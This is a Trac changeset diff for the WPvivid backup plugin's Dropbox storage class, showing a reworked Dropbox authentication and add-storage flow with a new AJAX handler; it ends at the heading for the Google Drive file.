  | 425 |  | ~~$id = sanitize\_text\_field($\_GET['id']);~~ |
  | 426 |  | ~~$auth\_id = uniqid('wpvivid-auth-');~~ |
  | 427 |  | ~~$remoteslist = WPvivid\_Setting::get\_all\_remote\_options();~~ |
  | 428 |  | ~~foreach ($remoteslist as $key => $value) {~~ |
  | 429 |  | ~~if (isset($value['name']) && $value['name'] == $alias\_name && $key != $id) {~~ |
  | 430 |  | ~~echo '<div class="notice notice-warning is-dismissible"><p>'.\_\_('Warning: The alias already exists in storage list.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 431 |  | ~~return;~~ |
  | 432 |  | ~~}~~ |
  | 433 |  | ~~}~~ |
  | 434 |  | ~~$state = admin\_url() . 'admin.php?page=WPvivid' . '&action=wpvivid\_dropbox\_finish\_update\_auth&name=' . $alias\_name . '&id=' . $id.'&auth\_id='.$auth\_id;~~ |
  | 435 |  | ~~$url = Dropbox\_Base::getUrl($this->redirect\_url, $state);~~ |
  | 436 |  | ~~header('Location: ' . filter\_var($url, FILTER\_SANITIZE\_URL));~~ |
  | 437 |  | ~~}~~ |
  | 438 |  | ~~catch (Exception $e){~~ |
  | 439 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 440 |  | ~~}~~ |
  | 441 |  | ~~}~~ |
  | 442 |  | ~~else if($\_GET['action'] === 'wpvivid\_dropbox\_finish\_update\_auth')~~ |
  | 443 |  | ~~{~~ |
  | 444 |  | ~~try {~~ |
  | 445 |  | ~~$remoteslist = WPvivid\_Setting::get\_all\_remote\_options();~~ |
  | 446 |  | ~~foreach ($remoteslist as $key => $value) {~~ |
  | 447 |  | ~~if (isset($value['auth\_id']) && isset($\_GET['auth\_id']) && $value['auth\_id'] == sanitize\_text\_field($\_GET['auth\_id'])) {~~ |
  | 448 |  | ~~\_e('<div class="notice notice-success is-dismissible"><p>You have successfully updated the storage alias.</p></div>');~~ |
  | 449 |  | ~~return;~~ |
  | 450 |  | ~~}~~ |
  | 451 |  | ~~}~~ |
  | 452 |  | ~~if (!isset($\_POST['code'])) {~~ |
  | 453 |  | ~~header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive\_update&result=error&resp\_msg=' . 'Get Dropbox token failed.');~~ |
  | 454 |  | ~~} else {~~ |
  | 455 |  | ~~global $wpvivid\_plugin;~~ |
  | 456 |  | ~~$remote\_options['type'] = WPVIVID\_REMOTE\_DROPBOX;~~ |
  | 457 |  | ~~$remote\_options['access\_token']= sanitize\_text\_field($\_POST['code']);~~ |
  | 458 |  | ~~$remote\_options['expires\_in'] = sanitize\_text\_field($\_POST['expires\_in']);~~ |
  | 459 |  | ~~$remote\_options['refresh\_token'] = sanitize\_text\_field($\_POST['refresh\_token']);~~ |
  | 460 |  | ~~$remote\_options['created']=time();~~ |
  | 461 |  | ~~$remote\_options['name'] = sanitize\_text\_field($\_GET['name']);~~ |
  | 462 |  | ~~$remote\_options['path'] = WPVIVID\_DROPBOX\_DEFAULT\_FOLDER;~~ |
  | 463 |  | ~~$remote\_options['auth\_id'] = sanitize\_text\_field($\_GET['auth\_id']);~~ |
  | 464 |  | ~~$ret = $wpvivid\_plugin->remote\_collection->update\_remote($remote\_options['auth\_id'], $remote\_options);~~ |
  | 465 |  | ~~if ($ret['result'] == 'success') {~~ |
  | 466 |  | ~~header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive\_update&result=success');~~ |
  | 467 |  | ~~return;~~ |
  | 468 |  | ~~} else {~~ |
  | 469 |  | ~~header('Location: ' . admin\_url() . 'admin.php?page=' . WPVIVID\_PLUGIN\_SLUG . '&action=wpvivid\_dropbox\_drive\_update&result=error&resp\_msg=' . $ret['error']);~~ |
  | 470 |  | ~~return;~~ |
  | 471 |  | ~~}~~ |
  | 472 |  | ~~}~~ |
  | 473 |  | ~~}~~ |
  | 474 |  | ~~catch (Exception $e){~~ |
  | 475 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 476 |  | ~~}~~ |
  | 477 |  | ~~}~~ |
  | 478 |  | ~~else if($\_GET['action']=='wpvivid\_dropbox\_drive\_update')~~ |
  | 479 |  | ~~{~~ |
  | 480 |  | ~~try {~~ |
  | 481 |  | ~~if (isset($\_GET['result'])) {~~ |
  | 482 |  | ~~if ($\_GET['result'] == 'success') {~~ |
  | 483 |  | ~~add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_edit\_dropbox\_success'));~~ |
  | 484 |  | ~~} else if ($\_GET['result'] == 'error') {~~ |
  | 485 |  | ~~add\_action('show\_notice', array($this, 'wpvivid\_show\_notice\_edit\_dropbox\_error'));~~ |
  | 486 |  | ~~}~~ |
  | 487 |  | ~~}~~ |
  | 488 |  | ~~}~~ |
  | 489 |  | ~~catch (Exception $e){~~ |
  | 490 |  | ~~echo '<div class="notice notice-error"><p>'.$e->getMessage().'</p></div>';~~ |
  | 491 |  | ~~}~~ |
  | 492 |  | ~~}~~ |
  | 493 | 418 | } |
  | 494 | 419 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L500) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L425) |  |
  | 500 | 425 | global $wpvivid\_plugin; |
  | 501 | 426 | $wpvivid\_plugin->wpvivid\_handle\_remote\_storage\_error($\_GET['resp\_msg'], 'Add Dropbox Remote'); |
  | 502 |  | ~~echo '<div class="notice notice-error"><p>'.esc\_html($\_GET['resp\_msg']).'</p></div>';~~ |
  | 503 |  | ~~}~~ |
  | 504 |  | ~~public function wpvivid\_show\_notice\_edit\_dropbox\_success(){~~ |
  | 505 |  | ~~echo '<div class="notice notice-success is-dismissible"><p>'.\_\_('You have successfully updated the storage alias.', 'wpvivid-backuprestore').'</p></div>';~~ |
  | 506 |  | ~~}~~ |
  | 507 |  | ~~public function wpvivid\_show\_notice\_edit\_dropbox\_error(){~~ |
  | 508 |  | ~~global $wpvivid\_plugin;~~ |
  | 509 |  | ~~$wpvivid\_plugin->wpvivid\_handle\_remote\_storage\_error($\_GET['resp\_msg'], 'Update Dropbox Remote');~~ |
  | 510 | 427 | echo '<div class="notice notice-error"><p>'.esc\_html($\_GET['resp\_msg']).'</p></div>'; |
  | 511 | 428 | } |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L521) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L438) |  |
  | 521 | 438 | global $wpvivid\_plugin; |
  | 522 | 439 | $root\_path=apply\_filters('wpvivid\_get\_root\_path', WPVIVID\_REMOTE\_DROPBOX); |
  | 523 |  | ?> |
  | 524 |  | <div id="storage\_account\_dropbox" class="storage-account-page" style="display:none;"> |
  | 525 |  | <div style="background-color:#f1f1f1; padding: 10px;"> |
  | 526 |  | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Dropbox authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 440 |  |
  |  | 441 | $remote = get\_option('wpvivid\_upload\_setting'); |
  |  | 442 | if($this->add\_remote) |
  |  | 443 | { |
  |  | 444 | ?> |
  |  | 445 | <div id="storage\_account\_dropbox" class="storage-account-page" style="display:none;"> |
  |  | 446 | <div style="background-color:#f1f1f1; padding: 10px;"> |
  |  | 447 | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Dropbox authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 448 | </div> |
  |  | 449 | <div style="color:#8bc34a; padding: 10px 10px 10px 0;"> |
  |  | 450 | <strong>Authentication is done, please continue to enter the storge information, then click 'Add Now' button to save it.</strong> |
  |  | 451 | </div> |
  |  | 452 | <div style="padding: 10px 10px 10px 0;"> |
  |  | 453 | <strong><?php \_e('Enter Your Dropbox Information', 'wpvivid-backuprestore'); ?></strong> |
  |  | 454 | </div> |
  |  | 455 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  |  | 456 | <tbody> |
  |  | 457 | <tr> |
  |  | 458 | <td class="plugin-title column-primary"> |
  |  | 459 | <div class="wpvivid-storage-form"> |
  |  | 460 | <input type="text" class="regular-text" autocomplete="off" option="dropbox" name="name" placeholder="<?php esc\_attr\_e('Enter a unique alias: e.g. Dropbox-001', 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/[^a-zA-Z0-9\-\_]/g,'')" /> |
  |  | 461 | </div> |
  |  | 462 | </td> |
  |  | 463 | <td class="column-description desc"> |
  |  | 464 | <div class="wpvivid-storage-form-desc"> |
  |  | 465 | <i><?php \_e('A name to help you identify the storage if you have multiple remote storage connected.', 'wpvivid-backuprestore'); ?></i> |
  |  | 466 | </div> |
  |  | 467 | </td> |
  |  | 468 | </tr> |
  |  | 469 | <tr> |
  |  | 470 | <td class="plugin-title column-primary"> |
  |  | 471 | <div class="wpvivid-storage-form"> |
  |  | 472 | <input type="text" class="regular-text" autocomplete="off" option="dropbox" name="path" value="<?php esc\_attr\_e($root\_path.WPVIVID\_DROPBOX\_DEFAULT\_FOLDER); ?>" readonly="readonly" /> |
  |  | 473 | </div> |
  |  | 474 | </td> |
  |  | 475 | <td class="column-description desc"> |
  |  | 476 | <div class="wpvivid-storage-form-desc"> |
  |  | 477 | <i><?php \_e('All backups will be uploaded to this directory.', 'wpvivid-backuprestore'); ?></i> |
  |  | 478 | </div> |
  |  | 479 | </td> |
  |  | 480 | </tr> |
  |  | 481 | <tr> |
  |  | 482 | <td class="plugin-title column-primary"> |
  |  | 483 | <div class="wpvivid-storage-form"> |
  |  | 484 | <input type="text" class="regular-text" autocomplete="off" value="mywebsite01" readonly="readonly" /> |
  |  | 485 | </div> |
  |  | 486 | </td> |
  |  | 487 | <td class="column-description desc"> |
  |  | 488 | <div class="wpvivid-storage-form-desc"> |
  |  | 489 | <a href="https://docs.wpvivid.com/wpvivid-backup-pro-dropbox-custom-folder-name.html"><?php \_e('Pro feature: Create a directory for storing the backups of the site', 'wpvivid-backuprestore'); ?></a> |
  |  | 490 | </div> |
  |  | 491 | </td> |
  |  | 492 | </tr> |
  |  | 493 | <tr> |
  |  | 494 | <td class="plugin-title column-primary"> |
  |  | 495 | <div class="wpvivid-storage-select"> |
  |  | 496 | <label> |
  |  | 497 | <input type="checkbox" option="dropbox" name="default" checked /><?php \_e('Set as the default remote storage.', 'wpvivid-backuprestore'); ?> |
  |  | 498 | </label> |
  |  | 499 | </div> |
  |  | 500 | </td> |
  |  | 501 | <td class="column-description desc"> |
  |  | 502 | <div class="wpvivid-storage-form-desc"> |
  |  | 503 | <i><?php \_e('Once checked, all this sites backups sent to a remote storage destination will be uploaded to this storage by default.', 'wpvivid-backuprestore'); ?></i> |
  |  | 504 | </div> |
  |  | 505 | </td> |
  |  | 506 | </tr> |
  |  | 507 | <tr> |
  |  | 508 | <td class="plugin-title column-primary"> |
  |  | 509 | <div class="wpvivid-storage-form"> |
  |  | 510 | <input id="wpvivid\_dropbox\_auth" class="button-primary" type="submit" value="<?php esc\_attr\_e('Add Now', 'wpvivid-backuprestore'); ?>"> |
  |  | 511 | </div> |
  |  | 512 | </td> |
  |  | 513 | <td class="column-description desc"> |
  |  | 514 | <div class="wpvivid-storage-form-desc"> |
  |  | 515 | <i><?php \_e('Click the button to add the storage.', 'wpvivid-backuprestore'); ?></i> |
  |  | 516 | </div> |
  |  | 517 | </td> |
  |  | 518 | </tr> |
  |  | 519 | </tbody> |
  |  | 520 | </table> |
  | 527 | 521 | </div> |
  | 528 |  | <div style="padding: 10px 10px 10px 0;"> |
  | 529 |  | <strong><?php \_e('Enter Your Dropbox Information', 'wpvivid-backuprestore'); ?></strong> |
  | 530 |  | </div> |
  | 531 |  | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  | 532 |  | <tbody> |
  | 533 |  | <tr> |
  | 534 |  | <td class="plugin-title column-primary"> |
  | 535 |  | <div class="wpvivid-storage-form"> |
  | 536 |  | <input type="text" class="regular-text" autocomplete="off" option="dropbox" name="name" placeholder="<?php esc\_attr\_e('Enter a unique alias: e.g. Dropbox-001', 'wpvivid-backuprestore'); ?>" onkeyup="value=value.replace(/[^a-zA-Z0-9\-\_]/g,'')" /> |
  | 537 |  | </div> |
  | 538 |  | </td> |
  | 539 |  | <td class="column-description desc"> |
  | 540 |  | <div class="wpvivid-storage-form-desc"> |
  | 541 |  | <i><?php \_e('A name to help you identify the storage if you have multiple remote storage connected.', 'wpvivid-backuprestore'); ?></i> |
  | 542 |  | </div> |
  | 543 |  | </td> |
  | 544 |  | </tr> |
  | 545 |  | <tr> |
  | 546 |  | <td class="plugin-title column-primary"> |
  | 547 |  | <div class="wpvivid-storage-form"> |
  | 548 |  | <input type="text" class="regular-text" autocomplete="off" option="dropbox" name="path" value="<?php esc\_attr\_e($root\_path.WPVIVID\_DROPBOX\_DEFAULT\_FOLDER); ?>" readonly="readonly" /> |
  | 549 |  | </div> |
  | 550 |  | </td> |
  | 551 |  | <td class="column-description desc"> |
  | 552 |  | <div class="wpvivid-storage-form-desc"> |
  | 553 |  | <i><?php \_e('All backups will be uploaded to this directory.', 'wpvivid-backuprestore'); ?></i> |
  | 554 |  | </div> |
  | 555 |  | </td> |
  | 556 |  | </tr> |
  | 557 |  | <tr> |
  | 558 |  | <td class="plugin-title column-primary"> |
  | 559 |  | <div class="wpvivid-storage-form"> |
  | 560 |  | <input type="text" class="regular-text" autocomplete="off" value="mywebsite01" readonly="readonly" /> |
  | 561 |  | </div> |
  | 562 |  | </td> |
  | 563 |  | <td class="column-description desc"> |
  | 564 |  | <div class="wpvivid-storage-form-desc"> |
  | 565 |  | <a href="https://docs.wpvivid.com/wpvivid-backup-pro-dropbox-custom-folder-name.html"><?php \_e('Pro feature: Create a directory for storing the backups of the site', 'wpvivid-backuprestore'); ?></a> |
  | 566 |  | </div> |
  | 567 |  | </td> |
  | 568 |  | </tr> |
  | 569 |  | <tr> |
  | 570 |  | <td class="plugin-title column-primary"> |
  | 571 |  | <div class="wpvivid-storage-select"> |
  | 572 |  | <label> |
  | 573 |  | <input type="checkbox" option="dropbox" name="default" checked /><?php \_e('Set as the default remote storage.', 'wpvivid-backuprestore'); ?> |
  | 574 |  | </label> |
  | 575 |  | </div> |
  | 576 |  | </td> |
  | 577 |  | <td class="column-description desc"> |
  | 578 |  | <div class="wpvivid-storage-form-desc"> |
  | 579 |  | <i><?php \_e('Once checked, all this sites backups sent to a remote storage destination will be uploaded to this storage by default.', 'wpvivid-backuprestore'); ?></i> |
  | 580 |  | </div> |
  | 581 |  | </td> |
  | 582 |  | </tr> |
  | 583 |  | <tr> |
  | 584 |  | <td class="plugin-title column-primary"> |
  | 585 |  | <div class="wpvivid-storage-form"> |
  | 586 |  | <input onclick="wpvivid\_dropbox\_auth();" class="button-primary" type="submit" value="<?php esc\_attr\_e('Authenticate with Dropbox', 'wpvivid-backuprestore'); ?>"> |
  | 587 |  | </div> |
  | 588 |  | </td> |
  | 589 |  | <td class="column-description desc"> |
  | 590 |  | <div class="wpvivid-storage-form-desc"> |
  | 591 |  | <i><?php \_e('Click the button to get Dropbox authentication and add it to the storage list below.', 'wpvivid-backuprestore'); ?></i> |
  | 592 |  | </div> |
  | 593 |  | </td> |
  | 594 |  | </tr> |
  | 595 |  | </tbody> |
  | 596 |  | </table> |
  | 597 |  | </div> |
  | 598 |  | <script> |
  | 599 |  | function wpvivid\_check\_dropbox\_storage\_alias(storage\_alias){ |
  | 600 |  | var find = 1; |
  | 601 |  | jQuery('#wpvivid\_remote\_storage\_list tr').each(function (i) { |
  | 602 |  | jQuery(this).children('td').each(function (j) { |
  | 603 |  | if (j == 3) { |
  | 604 |  | if (jQuery(this).text() == storage\_alias) { |
  | 605 |  | find = -1; |
  | 606 |  | return false; |
  |  | 522 | <script> |
  |  | 523 | function wpvivid\_check\_dropbox\_storage\_alias(storage\_alias) |
  |  | 524 | { |
  |  | 525 | var find = 1; |
  |  | 526 | jQuery('#wpvivid\_remote\_storage\_list tr').each(function (i) { |
  |  | 527 | jQuery(this).children('td').each(function (j) { |
  |  | 528 | if (j == 3) { |
  |  | 529 | if (jQuery(this).text() == storage\_alias) { |
  |  | 530 | find = -1; |
  |  | 531 | return false; |
  |  | 532 | } |
  | 607 | 533 | } |
  |  | 534 | }); |
  |  | 535 | }); |
  |  | 536 | return find; |
  |  | 537 | } |
  |  | 538 |  |
  |  | 539 | jQuery('#wpvivid\_dropbox\_auth').click(function() |
  |  | 540 | { |
  |  | 541 | wpvivid\_dropbox\_auth(); |
  |  | 542 | }); |
  |  | 543 |  |
  |  | 544 | function wpvivid\_dropbox\_auth() |
  |  | 545 | { |
  |  | 546 | wpvivid\_settings\_changed = false; |
  |  | 547 | var name=''; |
  |  | 548 | var path = ''; |
  |  | 549 | var bdefault = '0'; |
  |  | 550 | jQuery("input:checkbox[option=dropbox]").each(function(){ |
  |  | 551 | var key = jQuery(this).prop('name'); |
  |  | 552 | if(jQuery(this).prop('checked')) { |
  |  | 553 | bdefault = '1'; |
  |  | 554 | } |
  |  | 555 | else { |
  |  | 556 | bdefault = '0'; |
  | 608 | 557 | } |
  | 609 | 558 | }); |
  | 610 |  | }); |
  | 611 |  | return find; |
  | 612 |  | } |
  | 613 |  | function wpvivid\_dropbox\_auth() |
  | 614 |  | { |
  | 615 |  | wpvivid\_settings\_changed = false; |
  | 616 |  | var name=''; |
  | 617 |  | var path = ''; |
  | 618 |  | var bdefault = '0'; |
  | 619 |  | jQuery("input:checkbox[option=dropbox]").each(function(){ |
  | 620 |  | var key = jQuery(this).prop('name'); |
  | 621 |  | if(jQuery(this).prop('checked')) { |
  | 622 |  | bdefault = '1'; |
  | 623 |  | } |
  | 624 |  | else { |
  | 625 |  | bdefault = '0'; |
  | 626 |  | } |
  | 627 |  | }); |
  | 628 |  | jQuery('input:text[option=dropbox]').each(function() |
  | 629 |  | { |
  | 630 |  | var type = jQuery(this).prop('name'); |
  | 631 |  | if(type == 'name'){ |
  | 632 |  | name = jQuery(this).val(); |
  | 633 |  | } |
  | 634 |  | }); |
  | 635 |  | if(name == ''){ |
  | 636 |  | alert(wpvividlion.remotealias); |
  | 637 |  | } |
  | 638 |  | else if(wpvivid\_check\_dropbox\_storage\_alias(name) === -1){ |
  | 639 |  | alert(wpvividlion.remoteexist); |
  | 640 |  | } |
  | 641 |  | else{ |
  | 642 |  | location.href ='<?php echo admin\_url().'admin.php?page=WPvivid'.'&action=wpvivid\_dropbox\_auth&name='?>'+name+'<?php echo '&bdefault='?>'+bdefault; |
  | 643 |  | } |
  | 644 |  | } |
  | 645 |  | </script> |
  | 646 |  | <?php |
  |  | 559 | jQuery('input:text[option=dropbox]').each(function() |
  |  | 560 | { |
  |  | 561 | var type = jQuery(this).prop('name'); |
  |  | 562 | if(type == 'name'){ |
  |  | 563 | name = jQuery(this).val(); |
  |  | 564 | } |
  |  | 565 | }); |
  |  | 566 | if(name == ''){ |
  |  | 567 | alert(wpvividlion.remotealias); |
  |  | 568 | } |
  |  | 569 | else if(wpvivid\_check\_dropbox\_storage\_alias(name) === -1){ |
  |  | 570 | alert(wpvividlion.remoteexist); |
  |  | 571 | } |
  |  | 572 | else{ |
  |  | 573 | var ajax\_data; |
  |  | 574 | var remote\_from = wpvivid\_ajax\_data\_transfer('dropbox'); |
  |  | 575 | ajax\_data = { |
  |  | 576 | 'action': 'wpvivid\_dropbox\_add\_remote', |
  |  | 577 | 'remote': remote\_from |
  |  | 578 | }; |
  |  | 579 | jQuery('#wpvivid\_dropbox\_auth').css({'pointer-events': 'none', 'opacity': '0.4'}); |
  |  | 580 | jQuery('#wpvivid\_remote\_notice').html(''); |
  |  | 581 | wpvivid\_post\_request(ajax\_data, function (data) |
  |  | 582 | { |
  |  | 583 | try |
  |  | 584 | { |
  |  | 585 | var jsonarray = jQuery.parseJSON(data); |
  |  | 586 | if (jsonarray.result === 'success') |
  |  | 587 | { |
  |  | 588 | jQuery('#wpvivid\_dropbox\_auth').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 589 | jQuery('input:text[option=dropbox]').each(function(){ |
  |  | 590 | jQuery(this).val(''); |
  |  | 591 | }); |
  |  | 592 | jQuery('input:password[option=dropbox]').each(function(){ |
  |  | 593 | jQuery(this).val(''); |
  |  | 594 | }); |
  |  | 595 | wpvivid\_handle\_remote\_storage\_data(data); |
  |  | 596 | location.href='admin.php?page=WPvivid&action=wpvivid\_dropbox\_drive&main\_tab=storage&sub\_tab=dropbox&sub\_page=storage\_account\_dropbox&result=success'; |
  |  | 597 | } |
  |  | 598 | else if (jsonarray.result === 'failed') |
  |  | 599 | { |
  |  | 600 | jQuery('#wpvivid\_remote\_notice').html(jsonarray.notice); |
  |  | 601 | jQuery('input[option=add-remote]').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 602 | } |
  |  | 603 | } |
  |  | 604 | catch (err) |
  |  | 605 | { |
  |  | 606 | alert(err); |
  |  | 607 | jQuery('input[option=add-remote]').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 608 | } |
  |  | 609 |  |
  |  | 610 | }, function (XMLHttpRequest, textStatus, errorThrown) |
  |  | 611 | { |
  |  | 612 | var error\_message = wpvivid\_output\_ajaxerror('adding the remote storage', textStatus, errorThrown); |
  |  | 613 | alert(error\_message); |
  |  | 614 | jQuery('#wpvivid\_dropbox\_auth').css({'pointer-events': 'auto', 'opacity': '1'}); |
  |  | 615 | }); |
  |  | 616 | } |
  |  | 617 | } |
  |  | 618 | </script> |
  |  | 619 | <?php |
  |  | 620 | } |
  |  | 621 | else |
  |  | 622 | { |
  |  | 623 | ?> |
  |  | 624 | <div id="storage\_account\_dropbox" class="storage-account-page" style="display:none;"> |
  |  | 625 | <div style="background-color:#f1f1f1; padding: 10px;"> |
  |  | 626 | <?php \_e('Please read <a target="\_blank" href="https://wpvivid.com/privacy-policy" style="text-decoration: none;">this privacy policy</a> for use of our Dropbox authorization app (none of your backup data is sent to us).', 'wpvivid-backuprestore'); ?> |
  |  | 627 | </div> |
  |  | 628 | <div style="padding: 10px 10px 10px 0;"> |
  |  | 629 | <strong><?php \_e('Enter Your Dropbox Information', 'wpvivid-backuprestore'); ?></strong> |
  |  | 630 | </div> |
  |  | 631 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  |  | 632 | <tbody> |
  |  | 633 | <tr> |
  |  | 634 | <td class="plugin-title column-primary"> |
  |  | 635 | <div class="wpvivid-storage-form"> |
  |  | 636 | <input onclick="wpvivid\_dropbox\_auth();" class="button-primary" type="submit" value="<?php esc\_attr\_e('Authenticate with Dropbox', 'wpvivid-backuprestore'); ?>"> |
  |  | 637 | </div> |
  |  | 638 | </td> |
  |  | 639 | <td class="column-description desc"> |
  |  | 640 | <div class="wpvivid-storage-form-desc"> |
  |  | 641 | <i><?php \_e('Click to get Dropbox authentication.', 'wpvivid-backuprestore'); ?></i> |
  |  | 642 | </div> |
  |  | 643 | </td> |
  |  | 644 | </tr> |
  |  | 645 | </tbody> |
  |  | 646 | </table> |
  |  | 647 | </div> |
  |  | 648 | <script> |
  |  | 649 | function wpvivid\_dropbox\_auth() |
  |  | 650 | { |
  |  | 651 | location.href ='<?php echo admin\_url().'admin.php?page=WPvivid'.'&action=wpvivid\_dropbox\_auth'?>'; |
  |  | 652 | } |
  |  | 653 | </script> |
  |  | 654 | <?php |
  |  | 655 | } |
  | 647 | 656 | } |
  | 648 | 657 | public function wpvivid\_edit\_storage\_page\_dropbox() |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L652) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L661) |  |
  | 652 | 661 | <div id="remote\_storage\_edit\_dropbox" class="postbox storage-account-block remote-storage-edit" style="display:none;"> |
  | 653 | 662 | <div style="padding: 0 10px 10px 0;"> |
  | 654 |  | <strong><?php \_e('~~Enter Your Dropbox Information~~', 'wpvivid-backuprestore'); ?></strong> |
  |  | 663 | <strong><?php \_e('To add Dropbox, please get Dropbox authentication first. Once authenticated, you will be redirected to this page, then you can add storage information and save it', 'wpvivid-backuprestore'); ?></strong> |
  | 655 | 664 | </div> |
  | 656 | 665 | <table class="wp-list-table widefat plugins" style="width:100%;"> |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L671) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L680) |  |
  | 671 | 680 | <td class="plugin-title column-primary"> |
  | 672 | 681 | <div class="wpvivid-storage-form"> |
  | 673 |  | <input ~~onclick="wpvivid\_dropbox\_update\_auth();" class="button-primary" type="submit~~" value="<?php esc\_attr\_e('Save Changes', 'wpvivid-backuprestore'); ?>"> |
  |  | 682 | <input class="button-primary" type="submit" option="edit-remote" value="<?php esc\_attr\_e('Save Changes', 'wpvivid-backuprestore'); ?>"> |
  | 674 | 683 | </div> |
  | 675 | 684 | </td> |
  | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2661194#L747) | […](/browser/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-dropbox.php?rev=2667839#L756) |  |
  | 747 | 756 | return $storage\_type; |
  | 748 | 757 | } |
  |  | 758 |  |
  |  | 759 | public function finish\_add\_remote() |
  |  | 760 | { |
  |  | 761 | global $wpvivid\_plugin; |
  |  | 762 | $wpvivid\_plugin->ajax\_check\_security(); |
  |  | 763 | try { |
  |  | 764 | if (empty($\_POST) || !isset($\_POST['remote']) || !is\_string($\_POST['remote'])) { |
  |  | 765 | die(); |
  |  | 766 | } |
  |  | 767 |  |
  |  | 768 | $tmp\_remote\_options =get\_option('wpvivid\_tmp\_remote\_options',array()); |
  |  | 769 | delete\_option('wpvivid\_tmp\_remote\_options'); |
  |  | 770 | if(empty($tmp\_remote\_options)||$tmp\_remote\_options['type']!==WPVIVID\_REMOTE\_DROPBOX) |
  |  | 771 | { |
  |  | 772 | die(); |
  |  | 773 | } |
  |  | 774 |  |
  |  | 775 | $json = $\_POST['remote']; |
  |  | 776 | $json = stripslashes($json); |
  |  | 777 | $remote\_options = json\_decode($json, true); |
  |  | 778 | if (is\_null($remote\_options)) { |
  |  | 779 | die(); |
  |  | 780 | } |
  |  | 781 |  |
  |  | 782 | $remote\_options['created']=time(); |
  |  | 783 | $remote\_options['path'] = WPVIVID\_DROPBOX\_DEFAULT\_FOLDER; |
  |  | 784 | $remote\_options=array\_merge($remote\_options,$tmp\_remote\_options); |
  |  | 785 |  |
  |  | 786 | $ret = $wpvivid\_plugin->remote\_collection->add\_remote($remote\_options); |
  |  | 787 |  |
  |  | 788 | if ($ret['result'] == 'success') { |
  |  | 789 | $html = ''; |
  |  | 790 | $html = apply\_filters('wpvivid\_add\_remote\_storage\_list', $html); |
  |  | 791 | $ret['html'] = $html; |
  |  | 792 | $pic = ''; |
  |  | 793 | $pic = apply\_filters('wpvivid\_schedule\_add\_remote\_pic', $pic); |
  |  | 794 | $ret['pic'] = $pic; |
  |  | 795 | $dir = ''; |
  |  | 796 | $dir = apply\_filters('wpvivid\_get\_remote\_directory', $dir); |
  |  | 797 | $ret['dir'] = $dir; |
  |  | 798 | $schedule\_local\_remote = ''; |
  |  | 799 | $schedule\_local\_remote = apply\_filters('wpvivid\_schedule\_local\_remote', $schedule\_local\_remote); |
  |  | 800 | $ret['local\_remote'] = $schedule\_local\_remote; |
  |  | 801 | $remote\_storage = ''; |
  |  | 802 | $remote\_storage = apply\_filters('wpvivid\_remote\_storage', $remote\_storage); |
  |  | 803 | $ret['remote\_storage'] = $remote\_storage; |
  |  | 804 | $remote\_select\_part = ''; |
  |  | 805 | $remote\_select\_part = apply\_filters('wpvivid\_remote\_storage\_select\_part', $remote\_select\_part); |
  |  | 806 | $ret['remote\_select\_part'] = $remote\_select\_part; |
  |  | 807 | $default = array(); |
  |  | 808 | $remote\_array = apply\_filters('wpvivid\_archieve\_remote\_array', $default); |
  |  | 809 | $ret['remote\_array'] = $remote\_array; |
  |  | 810 | $success\_msg = \_\_('You have successfully added a remote storage.', 'wpvivid-backuprestore'); |
  |  | 811 | $ret['notice'] = apply\_filters('wpvivid\_add\_remote\_notice', true, $success\_msg); |
  |  | 812 | } |
  |  | 813 | else{ |
  |  | 814 | $ret['notice'] = apply\_filters('wpvivid\_add\_remote\_notice', false, $ret['error']); |
  |  | 815 | } |
  |  | 816 |  |
  |  | 817 | } |
  |  | 818 | catch (Exception $error) { |
  |  | 819 | $message = 'An exception has occurred. class: '.get\_class($error).';msg: '.$error->getMessage().';code: '.$error->getCode().';line: '.$error->getLine().';in\_file: '.$error->getFile().';'; |
  |  | 820 | error\_log($message); |
  |  | 821 | echo json\_encode(array('result'=>'failed','error'=>$message)); |
  |  | 822 | die(); |
  |  | 823 | } |
  |  | 824 | echo json\_encode($ret); |
  |  | 825 | die(); |
  |  | 826 | } |
  | 749 | 827 | } |
* ## [wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php](/changeset/2667839/wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php "Show the changeset 2667839 restricted to wpvivid-backuprestore/trunk/includes/customclass/class-wpvivid-google-drive.php")

